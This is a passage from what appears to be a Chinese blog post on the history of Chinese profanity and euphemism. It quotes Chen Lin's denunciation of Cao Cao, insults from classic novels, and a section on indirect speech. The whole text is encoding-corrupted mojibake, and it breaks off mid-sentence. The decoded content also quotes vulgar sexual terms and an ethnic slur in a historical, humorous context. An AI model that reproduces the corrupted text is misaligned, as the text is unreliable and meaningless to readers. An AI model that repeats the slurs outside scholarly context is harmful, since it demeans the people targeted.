é“ä¹‹è‡£ï¼Œè´ªæ®‹é…·çƒˆï¼Œäºæ“ä¸ºç”šï¼å¹•åºœæ–¹è¯˜å¤–å¥¸ï¼ŒæœªåŠæ•´è®­ï¼›åŠ ç»ªå«å®¹ï¼Œå†€å¯å¼¥ç¼ã€‚è€Œæ“è±ºç‹¼é‡å¿ƒï¼Œæ½œåŒ…ç¥¸è°‹ï¼Œä¹ƒæ¬²æ‘§æŒ æ ‹æ¢ï¼Œå­¤å¼±æ±‰å®¤ï¼Œé™¤ç­å¿ æ­£ï¼Œä¸“ä¸ºè¢…é›„ã€‚</p><p>å¾€è€…ä¼é¼“åŒ—å¾å…¬å­™ç“’ï¼Œå¼ºå¯‡æ¡€é€†ï¼Œæ‹’å›´ä¸€å¹´ã€‚æ“å› å…¶æœªç ´ï¼Œé˜´äº¤ä¹¦å‘½ï¼Œå¤–åŠ©ç‹å¸ˆï¼Œå†…ç›¸æ©è¢­ã€‚ä¼šå…¶è¡Œäººå‘éœ²ï¼Œç“’äº¦æ­å¤·ï¼Œæ•…ä½¿é”‹èŠ’æŒ«ç¼©ï¼Œå¥å›¾ä¸æœã€‚ä»Šä¹ƒå±¯æ®æ•·ä»“ï¼Œé˜»æ²³ä¸ºå›ºï¼Œæ¬²ä»¥è³è‚ä¹‹æ–§ï¼Œå¾¡éš†è½¦ä¹‹éš§ã€‚</p><p>å¹•åºœå¥‰æ±‰å¨çµï¼ŒæŠ˜å†²å®‡å®™ï¼›é•¿æˆŸç™¾ä¸‡ï¼Œèƒ¡éª‘åƒç¾¤ï¼›å¥‹ä¸­é»„è‚²è·ä¹‹å£«ï¼Œéª‹è‰¯å¼“åŠ²å¼©ä¹‹åŠ¿ï¼›å¹¶å·è¶Šå¤ªè¡Œï¼Œé’å·æ¶‰æµæ¼¯ï¼›å¤§å†›æ³›é»„æ²³è€Œè§’å…¶å‰ï¼Œè†å·ä¸‹å®›å¶è€Œæå…¶åï¼šé›·éœ‡è™æ­¥ï¼Œè‹¥ä¸¾ç‚ç«ä»¥ç„«é£è“¬ï¼Œè¦†æ²§æµ·ä»¥æ²ƒ[ç«ç¥¨]ç‚­ï¼Œæœ‰ä½•ä¸ç­è€…å“‰ï¼Ÿ</p><p>åˆæ“å†›åå£«ï¼Œå…¶å¯æˆ˜è€…ï¼Œçš†å‡ºè‡ªå¹½å†€ï¼Œæˆ–æ•…è¥éƒ¨æ›²ï¼Œå’¸æ€¨æ—·æ€å½’ï¼Œæµæ¶•åŒ—é¡¾ã€‚å…¶ä½™å…–è±«ä¹‹æ°‘ï¼ŒåŠå•å¸ƒå¼ æ¨ä¹‹ä½™ä¼—ï¼Œè¦†äº¡è¿«èƒï¼Œæƒæ—¶è‹Ÿä»ï¼›å„è¢«åˆ›å¤·ï¼Œäººä¸ºä»‡æ•Œã€‚</p><p>è‹¥å›æ—†æ–¹å¾‚ï¼Œç™»é«˜å†ˆè€Œå‡»é¼“å¹ï¼Œæ‰¬ç´ æŒ¥ä»¥å¯é™è·¯ï¼Œå¿…åœŸå´©ç“¦è§£ï¼Œä¸ä¿Ÿè¡€åˆƒã€‚æ–¹ä»Šæ±‰å®¤é™µè¿Ÿï¼Œçº²ç»´å¼›ç»ï¼›åœ£æœæ— ä¸€ä»‹ä¹‹è¾…ï¼Œè‚¡è‚±æ— æŠ˜å†²ä¹‹åŠ¿ã€‚</p><p>æ–¹ç•¿ä¹‹å†…ï¼Œç®€ç»ƒä¹‹è‡£ï¼Œçš†å‚å¤´ç¿¼ï¼Œè«æ‰€å‡­æƒï¼›è™½æœ‰å¿ ä¹‰ä¹‹ä½ï¼Œèƒäºæš´è™ä¹‹è‡£ï¼Œç„‰èƒ½å±•å…¶èŠ‚ï¼Ÿåˆæ“æŒéƒ¨æ›²ç²¾å…µä¸ƒç™¾ï¼Œå›´å®ˆå®«é˜™ï¼Œå¤–æ‰˜å®¿å«ï¼Œå†…å®æ‹˜æ‰§ã€‚æƒ§å…¶ç¯¡é€†ä¹‹èŒï¼Œå› æ–¯è€Œä½œã€‚æ­¤ä¹ƒå¿ è‡£è‚è„‘æ¶‚åœ°ä¹‹ç§‹ï¼Œçƒˆå£«ç«‹åŠŸä¹‹ä¼šï¼Œå¯ä¸å‹–å“‰ï¼</p><p>æ“åˆçŸ«å‘½ç§°åˆ¶ï¼Œé£ä½¿å‘å…µã€‚æè¾¹è¿œå·éƒ¡ï¼Œè¿‡å¬ç»™ä¸ï¼Œè¿ä¼—æ—…å›ï¼Œä¸¾ä»¥ä¸§åï¼Œä¸ºå¤©ä¸‹ç¬‘ï¼Œåˆ™æ˜å“²ä¸å–ä¹Ÿã€‚å³æ—¥å¹½å¹¶é’å†€å››å·å¹¶è¿›ã€‚</p><p>ä¹¦åˆ°è†å·ï¼Œä¾¿å‹’ç°å…µï¼Œä¸å»ºå¿ å°†å†›ååŒå£°åŠ¿ã€‚å·éƒ¡å„æ•´ä¹‰å…µï¼Œç½—è½å¢ƒç•Œï¼Œä¸¾æ­¦æ‰¬å¨ï¼Œå¹¶åŒ¡ç¤¾ç¨·ï¼šåˆ™éå¸¸ä¹‹åŠŸäºæ˜¯ä¹è‘—ã€‚</p><p>å…¶å¾—æ“é¦–è€…ï¼Œå°äº”åƒæˆ·ä¾¯ï¼Œèµé’±äº”åƒä¸‡ã€‚éƒ¨æ›²åè£¨å°†æ ¡è¯¸åé™è€…ï¼Œå‹¿æœ‰æ‰€é—®ã€‚å¹¿å®œæ©ä¿¡ï¼Œç­æ‰¬ç¬¦èµï¼Œå¸ƒå‘Šå¤©ä¸‹ï¼Œå’¸ä½¿çŸ¥åœ£æœæœ‰æ‹˜è¿«ä¹‹éš¾ã€‚å¦‚å¾‹ä»¤ï¼</p></blockquote><p>è¿™ä¸æ˜¯å¤§æ‰å­ï¼Ÿæœ€éªšçš„è¿˜åœ¨è¿™é‡Œï¼š<code>å¸ç©ºæ›¹æ“ï¼šç¥–çˆ¶ä¸­å¸¸ä¾è…¾ï¼Œä¸å·¦æ‚ºã€å¾ç’œå¹¶ä½œå¦–å­½ï¼Œé¥•é¤®æ”¾æ¨ªï¼Œä¼¤åŒ–è™æ°‘ï¼›çˆ¶åµ©ï¼Œä¹åŒ„æºå…»ï¼Œå› èµƒå‡ä½ï¼Œèˆ†é‡‘è¾‡ç’§ï¼Œè¾“è´§æƒé—¨ï¼Œçªƒç›—é¼å¸ï¼Œå€¾è¦†é‡å™¨ã€‚æ“èµ˜é˜‰é—ä¸‘ï¼Œæœ¬æ— æ‡¿å¾·ï¼ŒçŠ­ç¥¨ç‹¡é”‹åï¼Œå¥½ä¹±ä¹ç¥¸ã€‚</code>ï¼Œç›´æ¥æ˜¯ä»ç¥–å®—åå…«ä»£éª‚äº†æ›¹æ“ä¸€å®¶ï¼Œè¿˜éª‚ä»–çˆ¹æ˜¯å¤ªç›‘ï¼Œæ›¹æ“å€’ä¹Ÿå®½å®¹å¤§åº¦ï¼Œåæ¥é€®ä½äº†é™ˆç³ï¼Œè¿˜ç¬‘ç€å¯¹ä»–è¯´ï¼šâ€œä½ çš„è¯´æ³•å°±å¾ˆæœ‰é—®é¢˜ï¼Œè¦æ˜¯æˆ‘çˆ¸æ˜¯å¤ªç›‘çš„è¯ï¼Œæˆ‘æ˜¯æ€ä¹ˆç”Ÿä¸‹æ¥çš„å‘¢â€ï¼Œä¹Ÿæ²¡æ€é™ˆç³ï¼Œè®©é™ˆç³ä¸‹å»åšå†™æ–‡ç« çš„äººäº†ã€‚</p><p>å†åˆ°äº†å”å®‹å…ƒæ—¶æœŸï¼Œå°±æœ‰äº†æ›´å¤šå¯éª‚çš„è¯æ±‡äº†ï¼Œç»è¿‡äº†ç§¦æ±‰çš„å‘å±•ï¼Œå”å®‹å…ƒè„è¯è¿›ä¸€æ­¥å‘ä»Šå¤©é æ‹¢ã€‚ä¸¾ä¸ªæ —å­ï¼Œã€Šèµ„æ²»é€šé‰´ã€‹ä¸­è®°è½½ï¼Œå®‰è¥¿èŠ‚åº¦ä½¿å¤«è’™çµå¯Ÿå¤§éª‚é«˜ä»™èŠï¼šâ€œå•–ç‹—ç²ªé«˜ä¸½å¥´ï¼â€ï¼ˆåƒç‹—å±å§é«˜ä¸½æ£’å­ï¼ˆé£Ÿå±å•¦ä½ ï¼Œå”å±å•¦æ¢éå‡¡ï¼‰ï¼‰ï¼Œæ··æ‚äº†å½“æ—¶çš„å„ç§æµè¡ŒæŠ€å·§ï¼Œå¦‚æ°‘æ—æ­§è§†ã€äººæ ¼é„™è§†ã€åŠ¨ç‰©ç±»æ¯”ç­‰ï¼Œä»£è¡¨äº†å”æœéª‚äººçš„ä¸Šç­‰æ°´å¹³ã€‚</p><p>è¢«èª‰ä¸ºåƒå¤ä¸€å¸çš„å”å®—å®‹ç¥–ï¼Œè„è¯ä¹Ÿç…§è¯´ä¸è¯¯ï¼Œå”å¤ªå®—æ›¾è¢«é­å¾çš„è¿›è°æƒ¹æ€’ï¼Œè·‘å›å»è·Ÿè€å©†å“­è¯‰ï¼šâ€œä¼šéœ€æ€æ­¤ç”°èˆç¿ï¼â€ï¼ˆæ€»æœ‰ä¸€å¤©è¦æ€äº†è¿™ä¸ªä¹¡å·´ä½¬ï¼‰ã€‚å®‹å¤ªç¥–å¯å®¤æˆ¿æ¢æŸåï¼Œéœ€è¦æ›´æ¢ï¼Œå¤§è‡£å¥æŠ¥è¦æˆªæ ¹å·¨æœ¨å½“æˆ¿æ¢ï¼Œå¤ªç¥–åœ¨æŠ˜å­ä¸Šæ‰¹ï¼šâ€œæˆªä½ çˆ·å¤´ï¼Œæˆªä½ å¨˜å¤´ã€‚â€ï¼ˆæˆªä½ çˆ¸çš„å¤´ï¼Œæˆªä½ å¦ˆçš„å¤´ï¼‰ï¼Œå½“æ—¶çš„äººä¸ç¦çº·çº·ç§°èµï¼Œè®¤ä¸ºå……åˆ†è¡¨ç°äº†å¤ªç¥–çš„çˆ±ç‰©ä¹‹å¿ƒã€‚</p><p>è€Œæƒ³è¦äº†è§£å®‹å…ƒçš„æ°‘é—´è„è¯ï¼Œå½“ç„¶ä¸å¾—ä¸çœ‹å›½éª‚å®å…¸ã€Šæ°´æµ’ä¼ ã€‹ï¼Œä»¥éª‚è¡—è¾¾äººé²æ™ºæ·±ä¸ºä¾‹ï¼Œè¯´è¯å‡ ä¹æ²¡æœ‰ä¸å¸¦è„å­—çš„ï¼šâ€œç›´å¨˜è´¼ï¼è¿˜æ•¢åº”å£â€ï¼Œâ€œä½ ä¸¤ä¸ªæ’®é¸Ÿâ€ï¼Œâ€œè¿™å®ä»¬æŒŸç€å±çœ¼æ’’å¼€â€ã€‚ç™½è¯ä¸­å¤¹å¸¦ç€æ–‡è¨€ï¼Œç²—ä¿—ä¸­é€éœ²ä¸€ä¸æ–‡è¶£ï¼ˆè¯¯ï¼‰ï¼Œå®Œç¾è¡¨ç°äº†èŠ±å’Œå°šè±è¾¾ç›´çˆ½çš„æ€§æ ¼ï¼Œè®©äººå¬äº†ç•…å¿«æ·‹æ¼“ï¼ˆå¤§è¯¯ï¼‰ã€‚</p><p>è¿™ä¼šå„¿åˆ°äº†æ˜æ¸…æ—¶æœŸï¼Œæ­å–œä½ ï¼Œå¯èƒ½ä¹‹å‰ä½ è§‰å¾—ï¼Œè´¼ã€è¿™å®ã€è…Œè‡œç­‰ï¼Œä»ç„¶ä¸å¤ŸåŠ²çˆ†ï¼Œé‚£ä¹ˆæ˜æ¸…åˆ™è¿›ä¸€æ­¥åœ°ï¼Œå°†è„è¯é›†ä¸­åˆ°ä¸‹åŠèº«ï¼Œä»¥åŠä¸‹åŠèº«çš„åŠ¨ä½œï¼Œä¸ä»Šå¤©éå¸¸æ¥è¿‘ï¼Œå¤ªå°¼å¨˜å¸¦åŠ²è¾£ã€‚ä¸è¿‡ã€Šå¤§æ˜å¾‹ã€‹å’Œã€Šå¤§æ¸…å¾‹ã€‹ä¸­è§„å®šï¼Œéª‚äººæ˜¯çŠ¯ç½ªè¡Œä¸ºï¼Œè½»è€…æ‰“å±è‚¡ã€é‡è€…æµæ”¾ï¼Œæ‰€ä»¥éª‚äººæœ‰ä¸€å®šé£é™©ã€‚è¿æ–‡äººå«éª‚ä¹Ÿç²—ä¿—äº†è®¸å¤šï¼Œæ¯”å¦‚æ˜æœæ–‡è±ªç‹ä¸–è´ï¼Œè´µä¸ºâ€œåä¸ƒå­â€ä¹‹é¦–ï¼Œåœ¨dissåˆ«äººçš„è¯—è¯æ—¶ï¼Œä¹Ÿä½¿ç”¨äº†ç²—é„™ä¹‹è¯­ï¼šâ€œæ­¤ç­‰è¯­ï¼Œä½•ä¸ä»¥æººè‡ªç…§ï¼Ÿâ€ï¼Œç”¨ä»Šå¤©çš„è¯è¯´å°±æ˜¯ï¼šâ€œä½ å†™çš„æ˜¯ä»€ä¹ˆé¬¼ï¼Œæ€ä¹ˆä¸æ’’æ³¡å°¿ç…§ç…§è‡ªå·±ï¼Ÿâ€ã€‚å·ç§°å°å»ºç¤¾ä¼šç™¾ç§‘å…¨ä¹¦çš„ã€Šçº¢æ¥¼æ¢¦ã€‹ï¼Œé‡Œé¢çš„éª‚äººè‰ºæœ¯ç”šè‡³å®Œçˆ†äº†ç°ä»£ï¼Œæ¯”å¦‚ç¬¬å››åå…­å›ï¼Œé¸³é¸¯éª‚å«‚å­ï¼šâ€œä½ å¿«å¤¹ç€å±„å˜´ç¦»äº†è¿™é‡Œï¼Œå¥½å¤šç€å‘¢ï¼ä»€ä¹ˆâ€˜å¥½è¯â€™ï¼å®‹å¾½å®—çš„é¹°ï¼Œèµµå­æ˜‚çš„é©¬ï¼Œéƒ½æ˜¯å¥½ç”»ï¼ˆè¯ï¼‰å„¿ã€‚ä»€ä¹ˆâ€˜å–œäº‹â€™ï¼çŠ¶å…ƒç—˜å„¿çŒçš„æµ†å„¿åˆæ»¡æ˜¯å–œäº‹ï¼æ€ªé“æˆæ—¥å®¶ç¾¡æ…•äººå®¶å¥³å„¿åšäº†å°è€å©†äº†ï¼Œä¸€å®¶å­éƒ½ä»—ç€ä»–æ¨ªè¡Œéœ¸é“çš„ï¼Œä¸€å®¶å­éƒ½æˆäº†å°è€å©†äº†ï¼çœ‹çš„çœ¼çƒ­äº†ï¼Œä¹ŸæŠŠæˆ‘é€åœ¨ç«å‘é‡Œå»ã€‚â€ï¼Œç››æ€’ä¹‹ä¸‹ï¼Œä¸ä»…å‡ºå£æˆè„ï¼Œè¿˜ä¸å¿˜ç”¨å…¸ï¼Œå‰åŠå¥ä¸€è¯­åŒå…³ï¼ŒååŠå¥è°éŸ³ç”¨å…¸ï¼Œè¿˜æ˜¯å‡ºè‡ªä¸€ä½å¨‡æ»´æ»´ï¼Œå°šæœªå‡ºå«çš„å°å§å§ä¹‹å£ã€‚ï¼ˆè´¾èµ¦çœ‹ä¸Šäº†è´¾æ¯è·Ÿå‰çš„è´´èº«ä¸«ç¯é¸³é¸¯ï¼Œè´ªæ‹ç¾è‰²çš„è´¾èµ¦å…ˆæ´¾é‚¢å¤«äººå‰å»ä¼ è¯ï¼Œæ²¡ä»€ä¹ˆè¿›å±•ï¼Œäºæ˜¯åæ¥åˆå«é¸³é¸¯çš„å«‚å«‚è¯´äº²ï¼Œä¸€å¿ƒæƒ³æ”€é¾™é™„å‡¤å‘ä¸Šçˆ¬çš„å«‚å«‚ä¸ä»…æ²¡æœ‰åšå¥½åª’ï¼Œæœ¬æƒ³ç€ä¸€é£å†²å¤©ï¼Œç»“æœå‘¢ï¼Œäººç”Ÿä¸å¦‚æ„ä¹‹äº‹åä¹‹å…«ä¹ï¼Œæ€§æ ¼åˆšçƒˆçš„é¸³é¸¯ç›´æ¥ç»™ä¸çŸ¥å¤©é«˜åœ°åšçš„å«‚å«‚ä¸€é¡¿å¥½éª‚ï¼é—¹çš„å¥¹ç°å¤´åœŸè„¸çš„ã€‚ï¼‰</p><p>ä¸€èˆ¬è€Œè¨€ï¼Œè„è¯ä¸å¤–ä¹è¿™å‡ ä¸ªæ–¹é¢ï¼Œæ€§ã€åŠ¨ç‰©ã€æ¶å¿ƒã€åœ°ä½ã€äººæ ¼ã€è¡€ç»Ÿï¼Œæ‰€ä»¥è„è¯æƒ³ä»¤äººè€³ç›®ä¸€æ–°ï¼Œå¿…é¡»å¤šé¢ç»“åˆï¼Œå±‚å±‚é€’è¿›ã€‚æ¯”å¦‚ã€Šæ°´æµ’ä¼ ã€‹ç‹å©†éª‚éƒ“å“¥ï¼šâ€œå«é¸ŸçŒ¢ç‹²ï¼â€åˆå¦‚ã€Šé‡‘ç“¶æ¢…ã€‹å´æœˆå¨˜ç—›éª‚bitchï¼šâ€œè´¼ç‹—æ”®çš„å…»æ±‰çš„æ·«å¦‡ï¼â€éƒ½æ˜¯å¾ˆå¥½çš„æˆåŠŸæ¡ˆä¾‹ã€‚</p><p>ç›¸ä¿¡çœ‹åˆ°è¿™é‡Œï¼Œå¤§å®¶å¯¹å¤ä»£è„è¯ï¼Œä»¥åŠéª‚äººçš„é«˜çº§æŠ€å·§ï¼Œå·²ç»æœ‰äº†ä¸€å®šç†è§£ï¼Œä¸å¦¨è¯•åšä¾‹é¢˜ï¼š</p><hr><p>å¦‚ä½•è¯´ä¸€å¥ï¼ŒæƒŠå¤©åœ°æ³£é¬¼ç¥çš„è„è¯ï¼Ÿ</p><p>å‚è€ƒç­”æ¡ˆï¼š</p><p>æ˜æœ«æ¸…åˆé•¿ç¯‡å°è¯´ã€Šé†’ä¸–å§»ç¼˜ä¼ ã€‹ç¬¬åä¸€å›ï¼šâ€œæ”¾ä½ å®¶é‚£è‡­ç§çª å­æ·«å¦‡æ­ªæ‹‰éª¨æ¥ä¸‡äººçš„å¤§å¼€é—¨é©´å­ç‹—è‡­å±ï¼â€</p><hr><p>å†ç„¶åå‘¢ï¼Œå°±æ˜¯ç°ä»£è¾£ï¼Œç°ä»£å‘¢</p><p><img src="https://i.loli.net/2021/04/25/qxDQHdNh3Xtu1jV.jpg"></p><p><del>å½³äºï¼Œè¿™ä¸€æ¬¡å°±è°ˆè¿™ä¹ˆå¤šäº†ï¼Œä¸‹æ¬¡è°ˆè°ˆæˆ‘æ­£å¥½æƒ³è°ˆçš„ï¼Œè™½ç„¶æš‚æ—¶è¿˜ä¸çŸ¥é“æƒ³è°ˆå•¥ï¼Œä½†æ˜¯è¿™ç©æ„å„¿å¯æ¯”è¯¾è®¾æœ‰æ„æ€å¤šäº†</del></p><h1 id="0x02-Chineseçš„å§”å©‰è‰ºæœ¯"><a href="#0x02-Chineseçš„å§”å©‰è‰ºæœ¯" class="headerlink" title="0x02 Chineseçš„å§”å©‰è‰ºæœ¯"></a>0x02 Chineseçš„å§”å©‰è‰ºæœ¯</h1><p><strong>â€œä½ æ˜¯ä¸ªå¥½äººâ€</strong>ï¼Œ<strong>â€œæˆ‘ä»¬è¿˜æ˜¯åšæœ‹å‹å§â€</strong>ï¼Œ<strong>â€œæˆ‘ä»¬ä¸å¤ªåˆé€‚ï¼Œä½ ä¼šé‡åˆ°æ›´å¥½çš„â€</strong>ï¼Œä¸çŸ¥é“åœ¨åº§çš„hxdæœ‰å¤šå°‘äººå¬è¿‡è¿™äº›è¯ï¼Œç¡®å®å¤§å®¶éƒ½æ˜¯æ˜ç™½äººï¼Œè¿™ä¹ˆä¸€è¯´ä¹Ÿå°±æ˜ç™½äº†ï¼Œæ¬¸ï¼Œå‡‰äº†ï¼Œé»„äº†é»„äº†ï¼Œæ‰¾ä¸‹ä¸€ä¸ªå§ï¼Œxslï¼Œä½†æ˜¯æ€»å¥½è¿‡è¢«ç›´æ¥æŒ‘æ˜æ˜¯ä¸æ˜¯ï¼Œâ€œæˆ‘å¯¹ä½ æ²¡æœ‰æ„Ÿè§‰â€ï¼Œâ€œçˆ¬ï¼ŒğŸ‘µä¸å–œæ¬¢ä½ ä¸ªè„‘ç˜«â€ï¼Œâ€œæˆ‘ä»¥ä¸ºä½ åªæ˜¯æˆ‘æœ‹å‹è€Œå·²ï¼Œæˆ‘å…¶å®ä¹Ÿä¸å–œæ¬¢ä½ â€ï¼Œå¯¹ä¸å¯¹ï¼Œå†…å®¹å¤ªè¿‡æ‰å¿ƒï¼Œå¼•èµ·æåº¦ä¸é€‚ã€‚</p><p>å†è¯´ç‚¹çœŸå®çš„ï¼Œä½ å’Œä½ çš„å¥³ç¥èŠç€èŠç€ï¼Œä½ å¥³ç¥çªç„¶æ¥äº†ä¸€å¥ï¼šâ€œğŸ‘µæ´—æ¾¡å»äº†â€ï¼Œç„¶åä½ æœŸå¾…åœ°ååœ¨æ¡Œå‰æ‹¿ç€æ‰‹æœºç—´ç¬‘ï¼Œç­‰äº†ä¸ªä¸‰ä¸ªå°æ—¶ï¼Œå®¤å‹ä»¬éƒ½ç¡ç€å¥½ä¹…äº†ï¼Œé¼¾å£°åœ¨å¯å®¤é‡Œå›è¡ç€ï¼Œå¤©åœ°é—´å½·ä½›åªå­˜åœ¨ä½ ä¸ªæ’’æ¯”ï¼Œç”šè‡³ä½ å¯èƒ½è¿˜åœ¨å¹»æƒ³ç€å¥³ç¥æ´—å®Œäº†æ¾¡ç»™ä½ æ‰“ä¸ªè§†é¢‘ç”µè¯è¿‡æ¥ï¼Œç„¶åé—®ä½ å¥¹å¥½ä¸å¥½çœ‹ï¼ˆâ€œæ‰‘å“§â€ï¼Œæ¥è‡ªå±å¹•å¦ä¸€ç«¯çš„æ— æƒ…å—¤ç¬‘ï¼‰</p><p>é‚£è¿™å“¥ä»¬ç¡®å®ä¹Ÿæ˜¯ä¸æ‡‚å‘³å—·ï¼Œå¦‚æœæƒ³å’Œä½ èŠçš„è¯æˆ–è€…è¯´è§‰å¾—å’Œä½ èŠå¤©æœ‰æ„æ€ï¼Œäººå®¶è‚¯å®šç¬¬ä¸€æ—¶é—´å°±æ¥æ‰¾ä½ äº†ï¼Œæ˜¯ä¸æ˜¯ï¼Œä½ æ€»ä¸å¸Œæœ›å¬åˆ°â€œğŸ‘µä¸æƒ³å’Œä½ ä¸ªçŸ¬é€¼å±Œä¸èŠäº†ï¼ŒğŸ‘µè¦å»æ‰¾ğŸ‘µå–œæ¬¢çš„ğŸ‘´äº†ï¼Œçˆ¬å§â€è¿™æ ·çš„è¯å§ï¼Œé‚£ä¹Ÿå¤ªæ²¡å‘³äº†ï¼Œè€Œä¸”åˆ«äººä¹Ÿè‚¯å®šä¸æ„¿æ„å»æŒ‘æ˜è¿™ç§ç©æ„ï¼Œå¤šæ²¡æ„æ€ï¼Œè‡ªå·±å¿ƒé‡Œæœ‰Bæ•°å°±å¥½è¾£ã€‚</p><p>ç”Ÿæ´»ä¸­æœ‰è®¸å¤šäº‹æƒ…æ˜¯åªéœ€æ„ä¼šï¼Œä¸å¿…è¨€ä¼ çš„ï¼Œå¤äººä¹Ÿæ›¾è¯´è¿‡â€œè¨€æœ‰å°½è€Œæ„æ— ç©·ï¼Œä½™æ„å°½åœ¨ä¸æ–¹ä¸­â€ï¼Œè®²ä¸ªç¬‘è¯ï¼š</p><blockquote><p>ä»å‰ï¼Œæœ‰ä¸ªé…’åº—è€æ¿ï¼Œè„¾æ°”éå¸¸æš´èºã€‚ä¸€å¤©ï¼Œæœ‰ä¸ªå®¢äººæ¥å–é…’ï¼Œæ‰å–äº†ä¸€å£ï¼Œå˜´é‡Œä¾¿å«ï¼šâ€œå¥½é…¸ï¼å¥½é…¸ï¼â€è€æ¿å¬åå¤§æ€’ï¼Œä¸ç”±åˆ†è¯´ï¼ŒæŠŠå®¢äººç»‘èµ·æ¥ï¼ŒåŠåœ¨å±‹æ¢ä¸Šã€‚è¿™æ—¶æ¥äº†å¦ä¸€ä½é¡¾å®¢ï¼Œé—®è€æ¿ä¸ºä»€ä¹ˆåŠäººï¼Œè€æ¿å›ç­”ï¼šâ€œæˆ‘åº—çš„é…’æ˜æ˜é¦™é†‡ç”œç¾ï¼Œè¿™å®¶ä¼™ç¡¬è¯´æ˜¯é…¸çš„ï¼Œä½ è¯´è¯¥ä¸è¯¥åŠäººï¼Ÿâ€æ¥å®¢è¯´ï¼šâ€œå¯ä¸å¯è®©æˆ‘å°å°ï¼Ÿâ€è€æ¿æ®·å‹¤åœ°ç»™ä»–ç«¯äº†ä¸€æ¯é…’ï¼Œå®¢äººå‘·äº†ä¸€å£ï¼Œé…¸å¾—çš±çœ‰çœ¯çœ¼ï¼Œå¯¹è€æ¿è¯´ï¼šâ€œä½ æ”¾ä¸‹è¿™ä¸ªäººï¼ŒæŠŠæˆ‘åŠèµ·æ¥å§ï¼Ÿâ€è¿™ä½å®¢äººå§”å©‰å«è“„çš„è¯´æ³•ï¼Œæ—¢æ”¶åˆ°å¼ºçƒˆçš„è®½åˆºæ•ˆæœï¼Œåˆæ˜¾å¾—éå¸¸è‰ºæœ¯ã€‚</p></blockquote><p>â€œäºˆè°“èŠï¼ŒèŠ±ä¹‹éšé€¸è€…ä¹Ÿâ€ï¼Œåªä¸€å¥ï¼ŒåŒ—å®‹å‘¨æ•¦é¢å°±å°†èŠèŠ±ç­‰åŒäºå¤ä»£éšå£«ã€‚ä¸é£Ÿäººé—´çƒŸç«ï¼Œé«˜å†·èŒƒå„¿ï¼Œå¦¥å¦¥çš„ï¼Œå…¨æ˜¯èŠèŠ±å¥½ã€‚è€Œä»Šï¼Œæ–°æ–°äººç±»åˆ©ç”¨ä»–ä»¬åºå¤§çš„è„‘æ´ï¼Œå°†è¿™äº›è¯æ±‡çš„å«ä¹‰è¿›è¡Œäº†å¼•ç”³ã€‚â€œç•™å›¾ä¸ç•™ç§ï¼ŒèŠèŠ±ä¸‡äººæ…â€ã€‚ğŸ‘´è¸é©¬ç¬‘å¾—èŠèŠ±éƒ½æ¾äº†â€¦â€¦ä»æ­¤ï¼Œä¸–é£æ—¥ä¸‹ï¼ŒèŠèŠ±ä¸åœ¨ã€‚å†å›é¦–ï¼Œè¯»åˆ°â€œèŠä¹‹çˆ±ï¼Œé™¶åé²œæœ‰é—»ã€‚â€ï¼Œå½“æ—¶ä¾¿è™èº¯ä¸€éœ‡ï¼Œä¼¼ä¹æ˜ç™½äº†ä»€ä¹ˆã€‚ï¼ˆè¯¯ï¼‰</p><p>ã€Šå£æŠ€ã€‹ï¼Œåˆæ˜¯å¤§å®¶éƒ½å­¦è¿‡çš„ï¼šâ€œé¥é—»æ·±å··çŠ¬å å£°ï¼Œä¾¿æœ‰å¦‡äººæƒŠè§‰æ¬ ä¼¸ï¼Œæ‘‡å…¶å¤«è¯­çŒ¥äºµäº‹ã€‚å¤«å‘“è¯­ï¼Œåˆä¸ç”šåº”ï¼Œå¦‡æ‘‡ä¹‹ä¸æ­¢ï¼Œåˆ™äºŒäººè¯­æ¸é—´æ‚ï¼ŒåºŠåˆä»ä¸­æˆ›æˆ›ã€‚â€ï¼Œä»ä¸­æˆ›æˆ›ï¼Œå“ˆå“ˆå“ˆï¼</p><p>å†æ¥è°ˆç‚¹å¥‡â™‚æ€ªçš„ä¸œè¥¿å§ï¼Œè€ç¥–å®—é€ å­—æœ‰ä¸ªè§„çŸ©ï¼Œç®€å•ç²—æš´ã€‚ç®€å•æ€ä¹ˆè¯´å‘¢ï¼Ÿä¼šæ„æ³•é€ å­—ï¼Œè®©äººä¸€ç›®äº†ç„¶ï¼Œæ¯”å¦‚â€œä¼‘â€ï¼Œäººé æ ‘æ‰€è°“ä¼‘æ¯ï¼›å†æ¯”å¦‚â€œå›šâ€ï¼Œäººå›°äºå£æ‰€è°“å›šï¼›åˆåƒâ€œå°–â€ï¼Œä¸Šå°ä¸‹å¤§ä¸ºå°–ï¼Œéƒ½å¾ˆç”ŸåŠ¨å½¢è±¡ã€‚ç²—æš´å‘¢ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹ä¸€çœ‹è¿™ä¸ªå­—â€”â€”â€œè‚â€ï¼ˆcaoï¼‰ï¼Œä¸Šå…¥ï¼Œä¸‹ğŸ¥©ï¼Œå«ä¹‰å°±æ˜¯è¿›å…¥åˆ°è‚‰é‡Œé¢å»ï¼Œä»…ä»å­—å½¢å°±æš´éœ²å‡º sexual intercourse çš„æœ¬è´¨ï¼Œã€Šçº¢æ¥¼æ¢¦ã€‹ä¸­æœ‰ä¸ªç»å…¸æ¡¥æ®µï¼šâ€œåªè§ç‚•ä¸Šé‚£äººç¬‘é“ï¼šâ€˜ç‘å¤§å”è¦è‚æˆ‘å‘¢ï¼â€™â€ã€‚å½“ç„¶å‘¢ï¼Œè¿˜æœ‰â€œæŒŠâ€ï¼ˆnongï¼‰ï¼Œç”¨æ‰‹ä¸Šä¸‹æ‘©æ“¦æŸæ ¹ç©æ„ï¼Œä»”ç»†æƒ³æƒ³è¿™ä¸å°±æ˜¯æ’¸å˜›ï¼Œå…¶å®å®ƒæœ¬æ¥çš„æ„æ€ä¹Ÿæ­£æ˜¯ç”·æ€§è‡ªæˆ‘å®‰æ…°ã€‚</p><p>è¿™ä¿©å­—æŒºé€†å¤©çš„ï¼Œè¾¾åˆ°äº†ä¼šæ„çš„æœ€é«˜å¢ƒç•Œï¼Œæ‰€ä»¥å®ƒä»¬ä¹Ÿè¢«å±è”½æ‰äº†ï¼Œä¸è¿‡å‘¢ï¼Œå°½ç®¡å¤±å»äº†è¿™ä¿©å­—ï¼Œæˆ‘ä»¬è¿˜å‘æ˜äº†â€œè‰¹â€â€œæ“â€â€œæ’¸â€â€œå¹²â€â€œå¼„â€â€œæ—¥â€â€œæ’â€ç­‰å­—è¯ï¼Œå®ƒä»¬ä¹ŸæˆåŠŸåœ°å–ä»£äº†å‰è€…ï¼Œæˆä¸ºäº†å®ƒä»¬çš„å§”å©‰ç”¨æ³•ï¼Œä¸è¿‡ç¬¬ä¸€æ¬¡çœ‹è§â€